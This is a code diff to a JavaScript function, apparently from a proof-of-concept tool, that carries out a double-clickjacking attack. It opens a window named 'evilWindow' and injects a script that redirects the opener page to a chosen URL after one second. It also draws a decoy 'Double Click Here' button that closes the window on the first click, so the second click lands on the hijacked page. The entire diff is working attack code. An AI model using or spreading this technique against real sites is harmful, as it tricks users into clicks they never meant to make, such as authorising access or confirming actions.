@@ -8,17 +8,35 @@
         console.log("hi from opendoublewindow");
         console.log('url opendoublewindow',url);
         console.log('updown opendoublewindow',upDown);
-          var evilWindow = window.open(window.location.protocol+"//"+window.location.hostname+":"+window.location.port+"/random", "_blank");
-        console.log('evilWindow', evilWindow);
-        evilWindow.onload = function() {
-                    evilWindow.document.open();
-                    evilWindow.document.write(
-                        <script>
-                        setTimeout(function() { 
-                        opener.location = "${url}"; 
-                        }, 1000);
-                        </scri`+`pt>
-                };
+         var evilWindow = window.open(window.location.protocol+"//"+
+  		window.location.hostname+":"+
+  		window.location.port+"/random", 
+  	"_blank");
+
+    evilWindow.onload = function() {
+        evilWindow.document.open();
+
+        //plugs the page to be hijacked as opener returnee
+        evilWindow.document.write(`
+            <script>
+            console.log('Hijacking opener to:', "${url}");
+            setTimeout(function() { 
+                opener.location = "${url}"; 
+            }, 1000);
+
+            </scri`+`pt>
+            
+            <div id="doubleclick" type="button" class="button" 
+                style="top: ${top}px; left: ${left}px; width: ${width}px; height: ${height}px; position: absolute; font-size: 16px; color: white; background-color: #3498db; box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 20px; text-align: center; padding: 0 5px; transition: all 0.3s ease;" onmouseover="this.style.backgroundColor='#2980b9'; this.style.boxShadow='6px 6px 12px rgba(0, 0, 0, 0.4)'; this.style.transform='scale(1.05)';" 
+                onmouseout="this.style.backgroundColor='#3498db'; this.style.boxShadow='5px 5px 10px rgba(0, 0, 0, 0.3)'; this.style.transform='scale(1)';">Double Click Here</div>
+<script>
+      document.getElementById('doubleclick').addEventListener('mousedown', function() {
+       window.close();
+       });
+       </scr`+`ipt>`);
+        
+        evilWindow.document.close();
+    };
     }
     function getValuesFromForm(event) {
         event.preventDefault();
